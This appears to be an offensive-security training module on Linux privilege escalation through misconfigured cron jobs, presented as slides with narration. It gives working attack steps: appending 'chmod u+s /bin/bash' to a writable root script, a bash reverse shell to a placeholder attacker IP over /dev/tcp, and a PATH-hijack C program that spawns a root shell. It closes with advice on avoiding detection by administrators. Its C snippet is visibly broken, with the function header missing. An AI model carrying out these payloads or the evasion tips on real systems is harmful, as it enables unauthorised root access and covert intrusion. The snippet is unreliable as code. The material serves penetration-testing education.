content.html:
Module 7›Chapter 7.5›Understanding Cron Jobs
Core Concept

Understanding Cron Jobs

Automating Tasks on Linux Systems

What are Cron Jobs?

Cron jobs are scheduled commands or scripts that run automatically at specified intervals on Linux and Unix-like operating systems. They are defined in configuration files called crontabs.

Why They Matter

Essential for system maintenance (backups, log rotation, updates). However, misconfigurations are a frequent source of privilege escalation, especially when jobs run as root.

Key Takeaway

Cron jobs are powerful automation tools that, if misconfigured, can be exploited by attackers to gain elevated privileges on a system.

Cron Job Scheduling Explained

*Minute (0-59)
*Hour (0-23)
*Day of Month (1-31)
*Month (1-12)
*Day of Week (0-7)

Example: Daily Backup Script

0 2 * * * root /usr/local/bin/daily_backup.sh

This cron job runs the daily_backup.sh script at 2:00 AM every day as the root user.

Common Misconception

Many assume cron jobs are always secure because they're system-level. However, the security depends entirely on the script's permissions and the environment it runs in, not just its system-wide presence.

screens.title: System-Wide Cron Job Locations
screens.narratorSegment: The first critical step in exploiting cron jobs is enumeration: knowing where to look for them. System-wide cron jobs are those configured to run for the entire system, often managed by the root user, and are typically defined in several key locations. The primary configuration file is slash etc slash crontab, which explicitly defines the user under which each job will run. Beyond this, Linux systems often use a directory-based approach for organizing cron jobs. You'll find directories like slash etc slash cron. d slash, which holds individual cron files for specific applications or services, and slash etc slash cron. hourly slash, slash etc slash cron. daily slash, slash etc slash cron. weekly slash, and slash etc slash cron. monthly slash, which contain scripts that are executed at those respective intervals. It's important to remember that scripts placed directly into these hourly, daily, weekly, or monthly directories are typically executed by the root user by default. When you're reviewing these files and directories, pay close attention to the permissions and the content of the scripts. A common mistake is overlooking these directories, assuming all system cron jobs are only in slash etc slash crontab. Each of these locations represents a potential entry point for an attacker if misconfigured.

content.html:
Module 7›Chapter 7.5›System-Wide Cron Jobs

Key System Cron Locations

/etc/crontab

The main system crontab file. Explicitly defines the user for each job.

/etc/cron.d/

Directory for individual cron files, often used by installed applications.

/etc/cron.hourly/

Scripts in this directory run once every hour.

/etc/cron.daily/

Scripts in this directory run once every day.

/etc/cron.weekly/

Scripts in this directory run once every week.

/etc/cron.monthly/

Scripts in this directory run once every month.

Example: Listing /etc/cron.d/ contents

ls -la /etc/cron.d/

This command reveals individual cron job files that might be running privileged tasks.

Enumeration Strategy

System-Wide Cron Job Locations

Where to Find Global Scheduled Tasks

Why Check These?

These locations often contain jobs executed by the root user, making them prime targets for privilege escalation if their scripts or directories are writable by a low-privileged user.

Key Information to Extract

  • User executing the job (often root).
  • Full path to the script or command.
  • Frequency of execution.
Key Takeaway

Thoroughly examine all system-wide cron locations for jobs running as privileged users, as these are common vectors for privilege escalation.

screens.title: User-Specific Cron Jobs
screens.narratorSegment: While system-wide cron jobs are often the most lucrative targets due to their root execution context, it's equally important not to overlook user-specific cron jobs. These are scheduled tasks set up by individual users, and they run with the privileges of that specific user. To view the current user's cron jobs, you'll use the crontab -l command. This command displays the contents of the user's crontab file, which is typically stored in slash var slash spool slash cron slash crontabs slash under the user's username. For example, the root user's crontab might be slash var slash spool slash cron slash crontabs slash root. Even if a user-specific cron job doesn't run as root, it might still be vulnerable if it executes a script that is writable by another low-privileged user, or if it calls commands without full paths in a way that allows PATH variable manipulation. The key here is to be comprehensive in your enumeration. Don't just check the system-wide files; always check crontab -l for your current user and, if possible, for other users on the system. A common mistake is assuming that only root cron jobs are exploitable, but any misconfiguration can potentially be chained with other vulnerabilities.

content.html:
Module 7›Chapter 7.5›User-Specific Cron Jobs

Viewing User Crontabs

Command: crontab -l

crontab -l

Displays the cron jobs scheduled for the currently logged-in user.

Storage Location

/var/spool/cron/crontabs/<username>

Each user's crontab is stored as a file named after their username in this directory.

Example: Root's Crontab

cat /var/spool/cron/crontabs/root

This command would show the cron jobs scheduled to run as the root user, if you have sufficient permissions to read it.

Enumeration Strategy

User-Specific Cron Jobs

Checking Individual User Schedules

Why They Are Important

Even if not running as root, user cron jobs can be part of a privilege escalation chain if they execute scripts with insecure permissions or use commands vulnerable to PATH manipulation.

Key Considerations

  • Always check `crontab -l` for your current user.
  • Look for scripts with weak permissions.
  • Identify commands called without full paths.
Key Takeaway

User crontabs are a vital part of cron job enumeration; never assume only system-wide jobs are exploitable.

screens.title: Spotting Vulnerable Cron Jobs
screens.narratorSegment: Once you've enumerated the various cron job locations, the next crucial step is to identify which ones are actually vulnerable. This isn't just about finding any cron job; it's about finding the right ones that can be leveraged for privilege escalation. There are three primary indicators you should scrutinize in every crontab entry. First, the 'User executing the job' is paramount. We're primarily interested in jobs running as root or other highly privileged users, as these offer the most direct path to full system control. If a job runs as a low-privileged user, it might still be exploitable, but the impact would be limited to that user's privileges. Second, pay close attention to the 'Script or command being executed,' specifically its full path. If the path is relative or the script calls other commands without full paths, it opens up opportunities for PATH variable manipulation. Third, consider the 'Frequency' of the job. More frequent jobs, like those running every minute, offer faster exploitation, meaning you'll get your root shell much quicker. A common mistake is to only look for root jobs and ignore the script's path or frequency. All three factors are critical for assessing the exploitability and efficiency of a potential attack.

content.html:
Module 7›Chapter 7.5›Spotting Vulnerable Cron Jobs
Vulnerability Identification

Spotting Vulnerable Cron Jobs

What to Look For in Crontab Entries

Why These Factors?

These three elements directly influence the potential for privilege escalation. A job running as root, executing a modifiable script, and running frequently is a prime target.

Common Pitfall

Only focusing on the 'root' user. Even if a job runs as a non-root user, if its script is writable by another low-privileged user, it could still be part of a larger attack chain.

Key Takeaway

A truly vulnerable cron job combines privileged execution, a modifiable script/environment, and often, high frequency.

Key Indicators for Exploitation

1. User Executing the Job

Prioritize jobs running as root or other privileged users. This determines the level of access you can gain.

2. Script/Command Being Executed

Examine the full path. Look for writable scripts or commands called without full paths (e.g., rm instead of /bin/rm).

3. Frequency of Execution

More frequent jobs (e.g., every minute) allow for quicker exploitation and testing of payloads.

screens.title: Anatomy of a Vulnerable Crontab Entry
screens.narratorSegment: Let's look at a concrete example of a highly vulnerable cron job entry. Consider this line from slash etc slash crontab: asterisk asterisk asterisk asterisk asterisk root slash opt slash backup. sh. This seemingly innocuous line tells us several critical pieces of information. The asterisk asterisk asterisk asterisk asterisk part indicates that the job runs every minute, which is ideal for rapid exploitation. The root field explicitly states that this job will be executed with root privileges, making it a high-value target. Finally, slash opt slash backup. sh is the script that will be run. If we, as a low-privileged user, can gain write access to this slash opt slash backup. sh script, we can inject our own malicious commands. The combination of root execution and frequent scheduling makes this a prime candidate for privilege escalation. A common misconception is that only complex scripts are vulnerable; in reality, even simple scripts can be exploited if their permissions are misconfigured. This example highlights why understanding each field of a crontab entry is vital for identifying potential attack vectors. We're looking for that perfect storm of high privilege, frequent execution, and a modifiable target.

Module 7›Chapter 7.5›Vulnerable Crontab Entry

Example: A Highly Exploitable Cron Job

# m h dom mon dow user command * * * * * root /opt/backup.sh

Frequency: * * * * *

Runs every minute. This means a quick turnaround for exploitation attempts.

User: root

The job executes with the highest privileges, making any successful exploit grant root access.

Command: /opt/backup.sh

The specific script executed. If this script is writable by a low-privileged user, it's a direct path to root.

Vulnerability Example

Anatomy of a Vulnerable Crontab Entry

Dissecting a Prime Target for Exploitation

Why This is a Prime Target

The combination of root execution, frequent scheduling, and a specific script path makes this an ideal candidate for privilege escalation if the script's permissions are weak.

Actionable Insight

Your next step after identifying such an entry is to check the permissions of /opt/backup.sh. If it's writable by your current user, you've found a direct path to root.

Key Takeaway

A cron job running as root, frequently, and executing a specific script is a high-priority target for privilege escalation.

screens.title: Exploiting Writable Cron Scripts
screens.narratorSegment: One of the most straightforward ways to exploit a vulnerable cron job is by directly modifying the script it executes. This method is applicable when you've identified a cron job running as a privileged user, typically root, and the script it's configured to run is writable by your low-privileged user. The process is quite simple: you append your malicious command to the end of the existing script. For instance, you could add a command to make slash bin slash bash a SUID binary, which would then allow you to execute bash -p to gain a root shell. Alternatively, you could inject a reverse shell payload, causing the system to connect back to your attacking machine with root privileges. It's crucial to append your payload rather than overwriting the entire script. Overwriting could break legitimate system functionality, potentially alerting administrators to your presence. Always verify permissions using ls -l before attempting to modify. This technique is powerful because it directly leverages the cron job's existing privileges, turning a simple file write into a full privilege escalation. Remember, the cron job will execute your injected command the very next time it runs, which could be within minutes.

content.html:
Module 7›Chapter 7.5›Writable Cron Scripts
Exploitation Technique

Exploiting Writable Cron Scripts

Injecting Malicious Payloads for Root Access

The Core Idea

If a cron job runs as a privileged user (e.g., root) and its script is writable by your low-privileged user, you can modify the script to execute your own commands with elevated privileges.

Important Safety Note

Always append your payload to the script, rather than overwriting it. Overwriting can break legitimate system functions and alert administrators.

Key Takeaway

Writable cron scripts offer a direct and powerful path to privilege escalation by allowing direct injection of malicious commands.

Steps to Exploit Writable Scripts

1

Check Permissions

Use ls -l /path/to/script.sh to confirm write permissions for your user.

2

Append Malicious Command

Add your payload (e.g., SUID binary or reverse shell) to the end of the script.

3

Wait for Execution

The cron job will execute your command with its privileges on its next scheduled run.

4

Gain Elevated Shell

Access your root shell (e.g., /bin/bash -p or catch reverse shell).

screens.title: Writable Script Exploitation in Action
screens.narratorSegment: Let's walk through a practical example of exploiting a writable cron script. Imagine you've identified a cron job running slash opt slash backup. sh as root every minute, and you've confirmed that your low-privileged user has write permissions to slash opt slash backup. sh. Your goal is to gain a root shell. The simplest approach is to append a command that makes slash bin slash bash a SUID binary. This means that when slash bin slash bash is executed, it will run with the permissions of its owner, which in this case would be root. So, you would use echo "chmod u+s slash bin slash bash" greater than greater than slash opt slash backup. sh to add this command to the script. Once the cron job runs, slash bin slash bash will become SUID. Then, you can simply execute slash bin slash bash -p to get a root shell. Alternatively, for a reverse shell, you'd append bash -i greater than & slash dev slash tcp slash YOUR underscore IP slash YOUR underscore PORT 0 greater than &1 to the script, ensuring you have a Netcat listener set up on your attacking machine. This example demonstrates the direct and immediate impact of such a vulnerability. Scenario: Writable /opt/backup.sh

A cron job runs /opt/backup.sh as root every minute. Your user has write permissions to this script.

1. Verify Permissions

ls -l /opt/backup.sh
# Expected output: -rwxrwxr-x 1 root youruser ... /opt/backup.sh

2. Append SUID Bash Payload

echo "chmod u+s /bin/bash" >> /opt/backup.sh

This command adds a line to the script that will make /bin/bash SUID when executed by root.

3. Gain Root Shell

/bin/bash -p
whoami
# Expected output: root

After the cron job runs, execute /bin/bash -p to get a root shell. The -p flag ensures privileges are preserved.

Practical Example

Writable Script Exploitation in Action

Achieving Root with a Simple Append

Alternative: Reverse Shell

Instead of SUID bash, you could append: echo "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1" >> /opt/backup.sh. Remember to set up a Netcat listener on your attacking machine.

Why it Works

The cron job executes the script with root privileges. By appending your command, you ensure it runs with those same elevated permissions, granting you root access.

Directly modifying a writable root-owned cron script is a highly effective and quick method for privilege escalation.

screens.title: Exploiting the PATH Variable
screens.narratorSegment: Sometimes, the cron script itself isn't writable, but there's still a path to privilege escalation through the PATH variable. The PATH variable is an environment variable that tells the shell which directories to search for executable commands. When a command is executed without its full path, like rm instead of slash bin slash rm, the system searches through the directories listed in the PATH variable, in order, until it finds an executable with that name. The trick here is to place your own malicious executable with the same name as a command used in the cron script into a directory that appears *earlier* in the cron job's PATH than the legitimate command. For example, if a cron job runs cleanup. sh as root, and cleanup. sh contains rm asterisk. tmp, and slash tmp is in the cron job's PATH before slash bin, you could place a malicious rm executable in slash tmp. When the cron job runs, it will find and execute your rm from slash tmp instead of the legitimate slash bin slash rm, granting you root privileges. This method is particularly effective when cron jobs have a minimal or insecure PATH configuration. A common mistake is assuming the PATH is always secure; always verify the cron job's effective PATH.

Advanced Exploitation

Exploiting the PATH Variable

Hijacking Command Execution in Cron Jobs

What is the PATH Variable?

An environment variable that lists directories where the shell searches for executable commands. The order of directories matters significantly.

The Exploitation Principle

If a cron job calls a command without its full path (e.g., cat instead of /bin/cat), and you can place a malicious executable named cat in a directory that appears earlier in the cron job's PATH, your malicious version will be executed.

Key Takeaway

PATH variable manipulation allows you to substitute legitimate commands with malicious ones if the cron job's PATH is insecurely configured.

PATH Variable Exploitation Flow

1

Identify Unqualified Command

Find a cron job script that calls a command (e.g., service, rm, echo) without its full path.

2

Determine Cron Job's PATH

Understand the order of directories in the PATH variable used by the cron job. This is crucial for placement.

3

Create Malicious Binary

Compile a C program or script with the same name as the unqualified command (e.g., service) that spawns a root shell.

4

Place Binary in Writable PATH Directory

Put your malicious binary in a directory that is writable by your user and appears earlier in the cron job's PATH.

5

Wait for Execution & Gain Root

The cron job will execute your malicious binary instead of the legitimate one, granting you root access.

Scenario: Cron Job Calls service restart

A root cron job runs /opt/script.sh, which contains service restart. /tmp is writable and in the cron job's PATH before /usr/sbin.

#include <stdlib.h>
#include <sys/types.h>

    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}

gcc /tmp/service.c -o /tmp/service

3. Wait for Cron & Gain Root

# Cron job runs, executes /tmp/service
whoami
# Expected output: root

Your malicious service binary will be executed as root, granting you a root shell.

Hijacking the 'service' Command

A Practical PATH Variable Attack

Because /tmp is earlier in the cron job's PATH, the system finds and executes your malicious service before the legitimate one in /usr/sbin, all with root privileges.

Remember to be comprehensive. When modifying a script, always append your payload instead of overwriting the entire script. Overwriting can break system functionality and immediately alert administrators. Permissions are paramount: if you don't have write access to the script or its containing directory, direct modification or PATH exploitation won't work. The order of directories in the PATH variable is also critical; your malicious binary must be found *before* the legitimate one. Finally, be mindful of temporary files and resource usage. If your exploit relies on a temporary file, ensure it persists long enough. If your malicious script is resource-intensive and runs frequently, it could easily trigger alerts. By keeping these points in mind, you can increase your chances of successful exploitation while minimizing the risk of detection. These are not just 'gotchas' but fundamental principles for effective and stealthy privilege escalation.

Avoiding Detection and Ensuring Success
